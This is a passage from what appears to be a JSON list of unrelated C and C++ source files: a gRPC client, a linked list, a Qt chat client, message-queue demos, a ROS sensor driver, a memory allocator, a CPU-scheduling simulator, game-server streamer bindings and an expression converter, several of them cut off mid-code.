client(grpc::CreateChannel(\"localhost:50051\", grpc::InsecureChannelCredentials()));\r\n    double answer_value = 10.0;  // Example answer value\r\n    Variables response = client.ClientVerification(answer_value);\r\n\r\n    // Print response\r\n    std::cout << \"Received variables:\" << std::endl;\r\n    std::cout << \"a: \" << response.a() << \", b: \" << response.b() << \", c: \" << response.c()\r\n        << \", x: \" << response.x() << \", ServerContext: \" << response.servercontext() << std::endl;\r\n\r\n\r\n  \r\n    if (Connected == true) {\r\n        double answer_value = 10.0;\r\n        int port_value = RunGrpcCallInThread(client, answer_value);\r\n        std::cout << std::endl << port_value;\r\n        AuthClient client(grpc::CreateChannel(\"localhost:\" + std::to_string(port_value), grpc::InsecureChannelCredentials()));\r\n        answer_value = 10.0;\r\n        Variables response = client.ClientVerification(answer_value);\r\n        std::cout << \"Received variables:\" << std::endl;\r\n        std::cout << \"a: \" << response.a() << \", b: \" << response.b() << \", c: \" << response.c()\r\n            << \", x: \" << response.x() << \", ServerContext: \" << response.servercontext() << std::endl;\r\n\r\n    }\r\n    else {\r\n        std::cout << \"Not connected\";\r\n    }\r\n    \r\n\r\n    return 0;\r\n}",
    "\n#include <iostream>\n\n\nusing namespace  std;\n\nstruct Node {\n    int data;\n    Node* next;\n};\n\n\nvoid addNode(Node* &head, int value) {\n    Node* newNode = new Node(); // Crear un nuevo nodo en memoria\n    newNode -> data = value; // Asignacion de value a la estructura accediendo a data\n    newNode -> next = nullptr; // el siguiente nodo es nullptr\n\n    if(head == nullptr) {\n        head = newNode; // si la lista esta vacia el nuevo nodo es la head\n    } else {\n        Node* temp = head; // crear una variable temporal que almacene el current head\n        // recorremos la lista hasta el ultimo nodo\n        while(temp->next != nullptr) {\n            temp=temp->next;\n        }\n        temp->next = newNode; // enlazamos\n    }\n}\n\nvoid showList(Node* head) {\n    Node* temp = head;\n    while(temp != nullptr) {\n        cout << temp->data << \"-> \";\n        temp= temp -> next;\n    }\n}\n\nint main()\n{\n\n    Node* list  = nullptr;\n    addNode(list, 30);\n    addNode(list, 50);\n    addNode(list, 120);\n\n    cout << \"lista de valores: \" << endl;\n    showList(list);\n\n\n    return 0;\n}\n",
    "#include \"client.h\"\n\nClient::Client(QWidget *parent)\n    : QMainWindow(parent),loginui(new login)\n{\n    //loginui->setupUi(this);\n    loginui->show();\n    connect(loginui, &login::loginSuccessful, this, &Client::afterLogin);   // \ub85c\uadf8\uc778 \uc704\uc82f\uc5d0\uc11c \ucc44\ud305\ubc29 \uc120\ud0dd\ud558\ub294 \uc704\uc82f\uc73c\ub85c \ubcc0\uacbd\ud558\ub294 \uae30\ub2a5\n}\nClient::~Client()\n{\n    // \uba54\ubaa8\ub9ac \ud574\uc81c\n    //delete loginui;\n    //delete roomselectui;\n}\n\nvoid Client::afterLogin(const QString &username, const QString &password, QTcpSocket *socket)   // \ub85c\uadf8\uc778 \uc774\ud6c4 \ucc44\ud305\ubc29 \uc120\ud0dd\ud558\ub294 \uc704\uc82f\uc73c\ub85c \uc804\ud658\n{\n    qDebug() << \"afterLogin()!!!\";\n    this->username = username;  // \ud504\ub85c\uadf8\ub7a8\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc0ac\uc6a9\uc790 \uc774\ub984 \uc800\uc7a5\n    this->password = password;  // \ud504\ub85c\uadf8\ub7a8\uc5d0\uc11c \uc0ac\uc6a9\ud560 \ube44\ubc00\ubc88\ud638 \uc800\uc7a5\n    this->socket = socket;      // \ucc44\ud305\ucc3d\uacfc \uc11c\ubc84\ub791 \uc5f0\uacb0\ud560\ub54c \uc0ac\uc6a9\ud560 \uc18c\ucf13 \uc800\uc7a5\n\n                                // \uc18c\ucf13\uc758 \ubd80\ubaa8\ub97c Client\ub85c \uc124\uc815\n    socket->setParent(this);    // Client\uac00 \uc18c\ucf13\uc744 \uad00\ub9ac\ud558\ub3c4\ub85d \uc124\uc815 (\ub9e4\uc6b0 \uc911\uc694, \uc774 \ucf54\ub4dc \uc5c6\uc73c\uba74 \uc11c\ubc84 \ud1b5\uc2e0\uc774 \uc911\uac04\uc5d0 \ub04a\uae40)\n\n    loginui->hide();\n\n    //roomselectui= new ChatRoomSelection(username, password, socket, this);\n    // \uae30\uc874\uc758 roomselectui\uac00 \uc774\ubbf8 \uc0dd\uc131\ub418\uc5c8\ub2e4\uba74 \uc0ad\uc81c\ud558\uac70\ub098 \uc228\uae40 \ucc98\ub9ac\n    if (roomselectui) {\n        qDebug() << \"roomselectui already exists, removing old one\";\n        delete roomselectui;  // \uae30\uc874 roomselectui \uc0ad\uc81c\n        roomselectui = nullptr;  // \ud3ec\uc778\ud130 \ucd08\uae30\ud654\n    }\n\n    // \uc0c8\ub85c\uc6b4 roomselectui \uc0dd\uc131\n    qDebug() << \"chatRoomSelection!!! new! \";\n    roomselectui = new ChatRoomSelection(username, password, socket, this);\n    setCentralWidget(roomselectui);  // \uc911\uc559 \uc704\uc82f\uc744 \ucc44\ud305\ubc29 \uc120\ud0dd UI\ub85c \uc124\uc815\n    roomselectui->show();\n    qDebug() << \"roomselectui->show()!!!\";\n}\n",
    "#include <iostream>\n#include <sys/ipc.h>  // For IPC keys\n#include <sys/msg.h>  // For message queues\n#include <unistd.h>   // For fork()\n#include <cstdlib>    // For rand() and srand()\n#include <ctime>      // For time()\n#include <climits>    // For INT_MAX\n\n#define SIZE 20\n\n// Structure for message queue\nstruct message_buffer {\n    long message_type;\n    int min_value;\n};\n\n// Function to find the minimum in a given part of the array\nint findMin(int arr[], int start, int end) {\n    int minVal = INT_MAX;\n    for (int i = start; i <= end; ++i) {\n        if (arr[i] < minVal) {\n            minVal = arr[i];\n        }\n    }\n    return minVal;\n}\n\nint main() {\n    int arr[SIZE];\n    srand(time(0));\n\n    // Filling the array with random numbers\n    for (int i = 0; i < SIZE; i++) {\n        arr[i] = rand() % 100;  // Random numbers between 0 and 99\n    }\n\n    // Create a message queue\n    key_t key = ftok(\"min_queue\", 65);  // Unique key for the message queue\n    int msgid = msgget(key, 0666 | IPC_CREAT);  // Create message queue and return id\n\n    pid_t pid = fork();  // Create a child process\n\n    if (pid < 0) {\n        std::cerr << \"Fork failed!\" << std::endl;\n        return 1;\n    } \n    else if (pid == 0) {  // Child process\n        // Find the minimum in the second half of the array\n        int childMin = findMin(arr, SIZE / 2, SIZE - 1);\n        std::cout << \"Child Process (PID: \" << getpid() << \") found min: \" << childMin << std::endl;\n\n        // Send the result to the parent process using message queue\n        message_buffer message;\n        message.message_type = 1;\n        message.min_value = childMin;\n        msgsnd(msgid, &message, sizeof(message.min_value), 0);\n\n        exit(0);  // Exit the child process\n    } \n    else {  // Parent process\n        // Find the minimum in the first half of the array\n        int parentMin = findMin(arr, 0, (SIZE / 2) - 1);\n        std::cout << \"Parent Process (PID: \" << getpid() << \") found min: \" << parentMin << std::endl;\n\n        // Wait for the child to send its message\n        message_buffer message;\n        msgrcv(msgid, &message, sizeof(message.min_value), 1, 0);\n\n        // Calculate the overall minimum\n        int overallMin = (parentMin < message.min_value) ? parentMin : message.min_value;\n        std::cout << \"Overall minimum number in the array: \" << overallMin << std::endl;\n\n        // Destroy the message queue\n        msgctl(msgid, IPC_RMID, nullptr);\n    }\n\n    return 0;\n}\n",
    "#include <stdio.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <signal.h>\n#include <sys/wait.h>\n\n#include \"msg_send_recv.h\"\n\n//send_msg() performs send a message to a queue based on given msgid, child process in other program can receive message from this function\n//buf store mtype & mtext\nvoid send_msg(int msgid, struct my_msgbuf buf, long mtype) {\n    buf.mtype = mtype;\n    int len;\n    printf(\"Enter lines of text (type 'quit' to quit):\\n\");\n    while(1) {\n        fgets(buf.mtext, sizeof buf.mtext, stdin); //get input from user and store in buf.mtext\n        len = strlen(buf.mtext);\n\n        if(buf.mtext[len - 1] == '\\n') buf.mtext[len - 1] = '\\0'; //replace '\\n' (if exist) to '\\0'\n\n        //handle when user types quit\n        //append a string \"end\" at the end of this mtype (send signal to child process in other program, to terminate receiving message)\n        if(strcmp(buf.mtext, \"quit\") == 0) {\n            strcpy(buf.mtext, \"end\");\n            len = strlen(buf.mtext);\n            if (msgsnd(msgid, &buf, len + 1, 0) == -1) perror(\"msgsnd\");\n            printf(\"finished send_msg\\n\");\n            break;\n        }\n        \n        if(msgsnd(msgid, &buf, len + 1, 0) == -1) perror(\"msgsnd\"); //send message (buf) to message queue with msgid, len + 1 include '\\0', flag 0 means no flag setup\n\n        // printf(\"send message success, mtype = %ld, mtext = %s\\n\", buf.mtype, buf.mtext);\n    }\n}\n\n//recv_msg performs receive a message in a queue from parent process in other program\nvoid recv_msg(int msgid, struct my_msgbuf buf, long mtype) {\n    int toend;\n    while(1) {\n        //receive message from message queue with msgid (type = mtype), store into buffer\n        int msgrcv_ret = msgrcv(msgid, &buf, sizeof(buf.mtext), mtype, 0);\n        // printf(\"msgrcv_ret = %d\\n\", msgrcv_ret);\n\n        if(msgrcv_ret == -1) {\n            perror(\"msgrcv\");\n            // exit(1);\n        }\n\n        //console message from a process\n        printf(\"someone: %s\\n\", buf.mtext);\n\n        //user type 'quit', so this process stop receiving message\n        toend = strcmp(buf.mtext, \"end\");\n        if(toend == 0) {\n            printf(\"finished recv_msg\\n\");\n            break;\n        }\n    }\n}",
    "#include \"uwb_ros_driver.hpp\"\n\n#include <rclcpp/rclcpp.hpp>\n#include <std_msgs/msg/string.hpp>\n\nnamespace uwb_ros_driver\n{\nUWBROSDriver::UWBROSDriver(rclcpp::Node::SharedPtr nh,\n                           const std::string &topic,\n                           const std::vector<int> &ignored_ids,\n                           const double &max_range,\n                           const std::string &port,\n                           const int &baudrate,\n                           const int &timeout_ms)\n    : nh_(nh),\n      interface_(std::make_shared<Interface>(port, static_cast<uint32_t>(baudrate), static_cast<uint32_t>(timeout_ms))),\n      ignored_ids_(ignored_ids),\n      max_range_(max_range)\n{\n  pub_ = nh_->create_publisher<uwb_msgs::msg::Uwb>(topic, 10);\n}\n\nvoid UWBROSDriver::start()\n{\n  while (rclcpp::ok())\n  {\n    std::string raw_data;\n    if (!interface_->receive(raw_data))\n    {\n      RCLCPP_DEBUG(nh_->get_logger(), \"Failed to receive data\");\n      continue;\n    }\n\n    std::thread([this, raw_data]() mutable {\n      uint id;\n      double range;\n\n      if (!interface_->decode(raw_data, id, range))\n      {\n        RCLCPP_DEBUG(nh_->get_logger(), \"Failed to decode data\");\n        return;\n      }\n\n      {\n        std::scoped_lock lock(mtx_);\n\n        if (range < 0 || range > max_range_)\n        {\n          RCLCPP_DEBUG(nh_->get_logger(), \"Received range is out of bounds: %f\", range);\n          return;\n        }\n\n        if (std::find(ignored_ids_.begin(), ignored_ids_.end(), static_cast<uint>(id)) != ignored_ids_.end())\n        {\n          RCLCPP_DEBUG(nh_->get_logger(), \"Received id is ignored: %d\", id);\n          return;\n        }\n\n        publish(id, range);\n      }\n    }).detach(); // Use detach instead of join to allow multiple threads\n  }\n}\n\nvoid UWBROSDriver::publish(const uint &id, const double &range)\n{\n  uwb_msgs::msg::Uwb uwb;\n  uwb_msgs::msg::UwbMeasurement m;\n  uwb.header.stamp = nh_->now();\n  m.id = std::to_string(id);\n  m.distance = range;\n  uwb.ranges.emplace_back(m);\n  pub_->publish(uwb);\n}\n\n}  // namespace uwb_ros_driver\n",
    "#include\"MemoryAllocator.h\"\n\ntemplate<class T>\nMemory<T> ConstructMemroy(size_t N) {\n\tvoid* P = calloc(N, sizeof(T));\n\tMemory<T> M;\n\tM.M = (T*)P;\n\tM.L = N;\n\treturn M;\n}\n\ntemplate<class T>\nMemory<T> ConstructMemroyByArray(T* Te, size_t L) {\n\tvoid* P = calloc(L, sizeof(T));\n\tMemory<T> M;\n\tM.M = (T*)P;\n\tM.L = L;\n\n\tmemccpy(P, Te, L);\n\treturn M;\n}\n\ntemplate <class T>\nbool Free(Memory<T>& In) {\n\tfree(In.M);\n\tIn.M = NULL;\n\tIn.L = 0;\n\treturn true;\n}\n\ntemplate <class T>\nT* Index(Memory<T>& In, size_t Pos) {\n\treturn Pos >= In.L ? NULL : &In.M[Pos];\n}\n\ntemplate <class T>\nbool ReAllocateMemory(Memory<T>& In, size_t L) {\n\tvoid* P = realloc(In.M, L * sizeof(T));\n\tif (P != &In.M[0]) {\n\t\tIn.M = (T*)P;\n\t\tIn.L = L;\n\t}\n\tint X = ((int)In.L) - ((int)L);\n\tif (X > 0) {\n\t\tmemset(In.M + In.L * sizeof(T), 0, X);\n\t}\n\n\treturn true;\n}\n\ntemplate <class T>\nsize_t Size(Memory<T>& In) {\n\treturn In.L;\n}\n\ntemplate <class T>\nMemory<T> Duplicate(Memory<T>& In) {\n\tvoid* P = calloc(In.L, sizeof(T));\n\tMemory<T> M = { 0, };\n\tM.M = (T*)P;\n\tM.L = In.L;\n\n\tmemcpy(P, In.M, sizeof(T) * In.L);\n\tif (P == NULL) { M.L = 0; }\n\telse { memcpy(P, In.M, sizeof(T) * In.L); }\n\treturn M;\n}",
    "\ufeff/*\r\n\u250c\u2500\u2500\u2500\u2510Arrive    \u250c\u2500\u2500\u2500\u2500\u2500\u2510Dispatch    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510Terminate    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\r\n\u2502New\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502Ready\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502Running\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502Terminated\u2502\r\n\u2514\u2500\u2500\u2500\u2518          \u2502     \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502             \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\r\n\t\t\t   \u2514\u2500\u2500\u2500\u2500\u2500\u2518     Preempt\u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2518\r\n\t\t\t\t  \u25b2                   \u2502\r\n\t\t\t\t  \u2502                   \u2502IO Request\r\n\t\tIO Recieve\u2502     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\r\n\t\t\t\t  \u2514\u2500\u2500\u2500\u2500\u2500\u2524Blocked\u2502\u25c4\u2500\u2500\u2500\u2500\u2518\r\n\t\t\t\t\t\t\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\r\n*/\r\n\r\n#include <iostream>\r\n#include <vector>\r\n#include <fstream>\r\n#include <filesystem>\r\n#include <string>\r\n#include <queue>\r\n#include <cassert>\r\n#include <cstdarg>\r\n\r\nusing namespace std;\r\nusing namespace std::filesystem;\r\n\r\n//\r\n//\r\n\r\nenum job_state {\r\n\tJOB_NEW,\r\n\tJOB_READY,\r\n\tJOB_RUNNING,\r\n\tJOB_BLOCKED,\r\n\tJOB_TERMINATED\r\n};\r\n\r\nstruct job {\r\n\tjob_state state;\r\n\r\n\tuint64_t jid;\r\n\r\n\tuint64_t arrival_time;\r\n\r\n\tuint64_t turn_around_time;\r\n\tuint64_t wait_time;\r\n\tuint64_t io_time;\r\n\r\n\tqueue<uint64_t> bursts;\r\n};\r\n\r\ntemplate<>\r\nstruct less<job> {\r\n\tbool operator()(const job& a, const job& b) {\r\n\t\treturn a.arrival_time > b.arrival_time;\r\n\t}\r\n};\r\n\r\n//\r\n//\r\n\r\nenum event_type {\r\n\tEVT_TERMINATE,\r\n\tEVT_ARRIVE,\t\r\n\tEVT_IO_RECIEVE,\r\n\tEVT_IO_REQUEST,\r\n\tEVT_PREEMPT,   \r\n};\r\n\r\nstruct event {\r\n\tevent_type type;\r\n\tuint64_t jid;\r\n\tuint64_t arrival_time;\r\n};\r\n\r\ntemplate<>\r\nstruct less<event> {\r\n\tbool operator()(const event& a, const event& b) {\r\n\t\tif (a.arrival_time == b.arrival_time) {\r\n\t\t\treturn a.type > b.type;\r\n\t\t}\r\n\r\n\t\treturn a.arrival_time > b.arrival_time;\r\n\t}\r\n};\r\n\r\n//\r\n//\r\n\r\ndeque<uint64_t> READY_Q;\r\ndeque<uint64_t> IO_Q;\r\n\r\npriority_queue<event> EVENT_Q;\r\n\r\nvector<job> JOBS;\r\nuint64_t TIME;\r\nuint64_t QUANTUM;\r\nuint64_t CPU_IDLE_TIME;\r\n\r\njob* CPU_JOB;\r\njob* IO_JOB;\r\n\r\nofstream LOG_FOUT;\r\nofstream OUT_FOUT;\r\n\r\n//\r\n//\r\n\r\n\r\nstring format(const char* fmt, va_list vargs) {\r\n\tstring ret;\r\n\tsize_t ret_size = vsnprintf(nullptr, 0, fmt, vargs);\r\n\tret.resize(ret_size);\r\n\tvsnprintf(ret.data(), ret_size + 1, fmt, vargs);\r\n\treturn ret;\r\n}\r\n\r\nstring format(const char* fmt, ...) {\r\n\tva_list vargs;\r\n\tva_start(vargs, fmt);\r\n\tstring ret = format(fmt, vargs);\r\n\tva_end(vargs);\r\n\treturn ret;\r\n}\r\n\r\nvoid outf(const char* fmt, ...) {\r\n\tstring fmted;\r\n\r\n\tva_list vargs;\r\n\tva_start(vargs, fmt);\r\n\tfmted = format(fmt, vargs);\r\n\tva_end(vargs);\r\n\r\n\tcout << TIME << \": \" << fmted << endl;\r\n\tOUT_FOUT << TIME << \": \" << fmted << endl;\r\n\tLOG_FOUT << TIME << \": \" << fmted << endl;\r\n}\r\n\r\nvoid logf(const char* fmt, ...) {\r\n\tstring fmted;\r\n\r\n\tva_list vargs;\r\n\tva_start(vargs, fmt);\r\n\tfmted = format(fmt, vargs);\r\n\tva_end(vargs);\r\n\r\n\tLOG_FOUT << TIME << \": \" << fmted << endl;\r\n}\r\n\r\nvoid logf_fatal(const char* fmt, ...) {\r\n\tstring fmted;\r\n\r\n\tva_list vargs;\r\n\tva_start(vargs, fmt);\r\n\tfmted = format(fmt, vargs);\r\n\tva_end(vargs);\r\n\r\n\tLOG_FOUT << TIME << \": [FATAL]: \" << fmted << endl;\r\n\r\n\texit(-1);\r\n}\r\n\r\n#define logf_assert(_cond_, _fmt_, ...)\tif (!(_cond_))\tlogf_fatal((_fmt_), __VA_ARGS__)\r\n\r\n//\r\n//\r\n\r\njob& get_job(uint64_t jid) {\r\n\tlogf_assert(jid < JOBS.size(), \"Job with id = %llu could not be found\", jid);\r\n\treturn JOBS.at(jid);\r\n}\r\n\r\nbool is_cpu_idle() {\r\n\treturn CPU_JOB == nullptr;\r\n}\r\n\r\nbool is_io_idle() {\r\n\treturn IO_JOB == nullptr;\r\n}\r\n\r\njob& job_from_jid(uint64_t pid) {\r\n\treturn JOBS.at(pid);\r\n}\r\n\r\n//\r\n//\r\n\r\nvoid arrived(job& j) {\r\n\tlogf_assert(j.state == JOB_NEW, \"Job must be new to arrive\");\r\n\toutf(\"P%llu Arrives - Enters Ready Queue\", j.jid);\r\n\r\n\tj.state = JOB_READY;\r\n\tREADY_Q.push_back(j.jid);\r\n}\r\n\r\nvoid preempted() {\r\n\tlogf_assert(!is_cpu_idle(), \"CPU cannot be idle while preempted\");\r\n\tlogf_assert(CPU_JOB->state == JOB_RUNNING, \"CPU active job must be running to preempt\");\r\n\t\r\n\toutf(\"P%llu Preempted - Moved to Ready Queue\", CPU_JOB->jid);\r\n\r\n\tCPU_JOB->state = JOB_READY;\r\n\tCPU_JOB->bursts.front() -= QUANTUM;\r\n\tREADY_Q.push_back(CPU_JOB->jid);\r\n\tCPU_JOB = nullptr;\r\n}\r\n\r\nvoid terminated() {\r\n\tlogf_assert(!is_cpu_idle(), \"CPU cannot be idle while terminating\");\r\n\tlogf_assert(CPU_JOB->state == JOB_RUNNING, \"CPU active job must be running to terminate\");\r\n\r\n\toutf(\"P%llu Terminated\", CPU_JOB->jid);\r\n\r\n\tCPU_JOB->state = JOB_TERMINATED;\r\n\tCPU_JOB->turn_around_time = TIME - CPU_JOB->arrival_time;\r\n\tCPU_JOB = nullptr;\r\n}\r\n\r\nvoid io_requested() {\r\n\tlogf_assert(!is_cpu_idle(), \"CPU cannot be idle while requesting io\");\r\n\tlogf_assert(CPU_JOB->state == JOB_RUNNING, \"CPU active job must be running to perform io request\");\r\n\t\r\n\toutf(\"P%llu IO Blocked\", CPU_JOB->jid);\r\n\r\n\tCPU_JOB->state = JOB_BLOCKED;\r\n\tCPU_JOB->bursts.pop();\r\n\tIO_Q.push_back(CPU_JOB->jid);\r\n\tCPU_JOB = nullptr;\r\n}\r\n\r\nvoid io_recieved() {\r\n\tlogf_assert(!is_io_idle(), \"IO cannot be idle while recieving io\");\r\n\tlogf_assert(IO_JOB->state == JOB_BLOCKED, \"IO active job must be blocked to recieve io\");\r\n\r\n\toutf(\"P%llu IO Done\", IO_JOB->jid);\r\n\r\n\tIO_JOB->state = JOB_READY;\r\n\tIO_JOB->bursts.pop();\r\n\r\n\tREADY_Q.push_back(IO_JOB->jid);\r\n\r\n\tIO_JOB = nullptr;\r\n}\r\n\r\n//\r\n//\r\n\r\nvoid dispatch() {\r\n\tif (READY_Q.empty()) {\r\n\t\treturn;\r\n\t}\r\n\r\n\tCPU_JOB = &get_job(READY_Q.front());\r\n\tREADY_Q.pop_front();\r\n\t\r\n\tCPU_JOB->state = JOB_RU",
    "/*\n * Copyright (C) 2024 AmyrAhmady (iAmir), Incognito\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"../main.h\"\n\n#include \"omp-node.hpp\"\n#include \"../core.h\"\n#include \"../utility.h\"\n\nOMPNODE_API(StreamerObject, Create, int modelid, float x, float y, float z, float rx, float ry, float rz, int worldid, int interiorid, int playerid, float streamdistance, float drawdistance, int areaid, int priority)\n{\n\tif (core->getData()->getGlobalMaxItems(STREAMER_TYPE_OBJECT) == core->getData()->objects.size())\n\t{\n\t\tint ret = INVALID_STREAMER_ID;\n\t\tAPI_RETURN(int ret);\n\t\treturn INVALID_STREAMER_ID;\n\t}\n\tint objectId = Item::Object::identifier.get();\n\tItem::SharedObject object(new Item::Object);\n\tobject->amx = nullptr; // TODO must be checked if it's used anywhere\n\tobject->objectId = objectId;\n\tobject->inverseAreaChecking = false;\n\tobject->noCameraCollision = false;\n\tobject->originalComparableStreamDistance = -1.0f;\n\tobject->positionOffset = Eigen::Vector3f::Zero();\n\tobject->streamCallbacks = false;\n\tobject->modelId = modelid;\n\tobject->position = Eigen::Vector3f(x, y, z);\n\tobject->rotation = Eigen::Vector3f(rx, ry, rz);\n\tUtility::addToContainer(object->worlds, worldid);\n\tUtility::addToContainer(object->interiors, interiorid);\n\tUtility::addToContainer(object->players, playerid);\n\tobject->comparableStreamDistance = streamdistance < STREAMER_STATIC_DISTANCE_CUTOFF ? streamdistance : streamdistance * streamdistance;\n\tobject->streamDistance = streamdistance;\n\tobject->drawDistance = drawdistance;\n\tUtility::addToContainer(object->areas, areaid);\n\tobject->priority = priority;\n\tcore->getGrid()->addObject(object);\n\tcore->getData()->objects.insert(std::make_pair(objectId, object));\n\n\tint ret = objectId;\n\tAPI_RETURN(int ret);\n}\n\nOMPNODE_API(StreamerObject, Destroy, int objectid)\n{\n\tbool ret = false;\n\tstd::unordered_map<int, Item::SharedObject>::iterator o = core->getData()->objects.find(objectid);\n\tif (o != core->getData()->objects.end())\n\t{\n\t\tUtility::destroyObject(o);\n\t\tret = true;\n\t\tAPI_RETURN(bool ret);\n\t}\n\tAPI_RETURN(bool ret);\n}\n\nOMPNODE_API(StreamerObject, IsValid, int objectid)\n{\n\tbool ret = false;\n\tstd::unordered_map<int, Item::SharedObject>::iterator o = core->getData()->objects.find(objectid);\n\tret = o != core->getData()->objects.end();\n\tAPI_RETURN(bool ret);\n}\n\nOMPNODE_API(StreamerObject, GetPos, int objectid)\n{\n\tbool ret = false;\n\tfloat x = NAN;\n\tfloat y = NAN;\n\tfloat z = NAN;\n\n\tstd::unordered_map<int, Item::SharedObject>::iterator o = core->getData()->objects.find(objectid);\n\tif (o != core->getData()->objects.end())\n\t{\n\t\tif (o->second->move)\n\t\t{\n\t\t\tcore->getStreamer()->processActiveItems();\n\t\t}\n\n\t\tx = o->second->position[0];\n\t\ty = o->second->position[1];\n\t\tz = o->second->position[2];\n\t\tret = true;\n\t}\n\tAPI_RETURN(bool ret, float x, float y, float z);\n}\n\nOMPNODE_API(StreamerObject, SetPos, int objectid, float x, float y, float z)\n{\n\tbool ret = false;\n\tstd::unordered_map<int, Item::SharedObject>::iterator o = core->getData()->objects.find(objectid);\n\tif (o != core->getData()->objects.end())\n\t{\n\t\tEigen::Vector3f position = o->second->position;\n\t\to->second->position = Eigen::Vector3f(x, y, z);\n\t\tfor (std::unordered_map<int, Player>::iterator p = core->getData()->players.begin(); p != core->getData()->players.end(); ++p)\n\t\t{\n\t\t\tstd::unordered_map<int, int>::iterator i = p->second.internalObjects.find(o->first);\n\t\t\tif (i != p->second.internalObjects.end())\n\t\t\t{\n\t\t\t\tompgdk::SetPlayerObjectPos(p->first, i->second, o->second->position[0], o->second->position[1], o->second->position[2]);\n\t\t\t}\n\t\t}\n\t\tif (position[0] != o->second->position[0] || position[1] != o->second->position[1])\n\t\t{\n\t\t\tif (o->second->cell)\n\t\t\t{\n\t\t\t\tcore->getGrid()->removeObject(o->second, true);\n\t\t\t}\n\t\t}\n\t\tif (o->second->move)\n\t\t{\n\t\t\to->second->move->duration = static_cast<int>((static_cast<float>(boost::geometry::distance(std::get<0>(o->second->move->position), o->second->position) / o->second->move->speed) * 1000.0f));\n\t\t\tstd::get<1>(o->second->move->position) = o->second->position;\n\t\t\tstd::get<2>(o->second->move->position) = (std::get<0>(o->second->move->position) - o->second->position) / static_cast<float>(o->second->move->duration);\n\t\t\tif ((std::get<0>(o->second->move->rotation).maxCoeff() + 1000.0f) > std::numeric_limits<float>::epsilon())\n\t\t\t{\n\t\t\t\tstd::get<1>(o->second->move->rotation) = o->second->rotation;\n\t\t\t\tstd::get<2>(o->second->move->rotation) = (std::get<0>(o->second->move->rotation) - o->second->rotation) / static_cast<float>(o->seco",
    "#include<iostream>\r\n#include<stack>\r\n#include<string>\r\n#include<cctype>\r\n#include<vector>\r\nusing namespace std;\r\n\r\nclass cal {\r\npublic:\r\n\tvector<string> output; //\u8f93\u51fa\u7684\u7ed3\u679c\r\n\tint Priority(char c) {\r\n\t\tswitch (c)\r\n\t\t{\r\n\t\tcase '+' :\treturn 1;\r\n\t\tcase '-':\treturn 1;\r\n\t\tcase '/':\treturn 2;\r\n\t\tcase '*':\treturn 2;\r\n\t\tcase '^':\treturn 3;\r\n\t\tdefault:\n\t\t\treturn -1;\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\tvoid in_post(const string &s)\r\n\t{\r\n\t\tstack<char> op; // \u7528\u4e8e\u4fdd\u5b58\u64cd\u4f5c\u7b26\r\n\t\tfor (int i = 0; i < s.size(); i++)\r\n\t\t{\r\n\t\t\tif (s[i] == ' ')\tcontinue;\r\n\t\t\tif (s[0] == '-')\tcontinue;\r\n\t\t\tif (isdigit(s[i]))\r\n\t\t\t{\r\n\t\t\t\tint num = s[i] - '0';\r\n\t\t\t\twhile (isdigit(s[i+1]))\r\n\t\t\t\t{\r\n\t\t\t\t\tnum = num * 10 + (s[i + 1] - '0');\r\n\t\t\t\t\ti++;\r\n\t\t\t\t}\r\n\t\t\t\toutput.push_back(to_string(num));\r\n\t\t\t}\r\n\t\t\telse if (isalpha(s[i]))\r\n\t\t\t{\r\n\t\t\t\toutput.push_back(string(1,s[i]));\r\n\t\t\t}\r\n\t\t\telse if (s[i]=='(')\r\n\t\t\t{\r\n\t\t\t\top.push(s[i]);\r\n\t\t\t}\r\n\t\t\telse if (s[i]==')')\r\n\t\t\t{\r\n\t\t\t\twhile (!op.empty()&&op.top()!='(')\r\n\t\t\t\t{\r\n\t\t\t\t\toutput.push_back(string(1,op.top()));\r\n\t\t\t\t\top.pop();\r\n\t\t\t\t}\r\n\t\t\t\top.pop();\r\n\t\t\t}\r\n\t\t\telse { // \u5904\u7406\u64cd\u4f5c\u7b26\r\n\t\t\t\twhile (!op.empty() && Priority(s[i]) <= Priority(op.top())) {\r\n\t\t\t\t\toutput.push_back(string(1, op.top())); // \u5c06\u64cd\u4f5c\u7b26\u52a0\u5165\u8f93\u51fa\r\n\t\t\t\t\top.pop();\r\n\t\t\t\t}\r\n\t\t\t\top.push(s[i]); // \u5f53\u524d\u64cd\u4f5c\u7b26\u5165\u6808\r\n\t\t\t}\r\n\t\t}\r\n\t\twhile (!op.empty())\r\n\t\t{\r\n\t\t\toutput.push_back(string(1,op.top()));\r\n\t\t\top.pop();\r\n\t\t}\r\n\t}\r\n\tvoid show_post(const vector<string>& out) {\r\n\t\tfor (const auto& str : out) {\r\n\t\t\tcout << str << \" \"; // \u8f93\u51fa\u540e\u7f00\u8868\u8fbe\u5f0f\r\n\t\t}\r\n\t\tcout << endl; // \u8f93\u51fa\u6362\u884c\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tcal c;\r\n\tc.in_post(\"2*(9+6/3-5)+4\");\r\n\tc.show_post(c.output);\r\n\treturn 0;\r\n}",
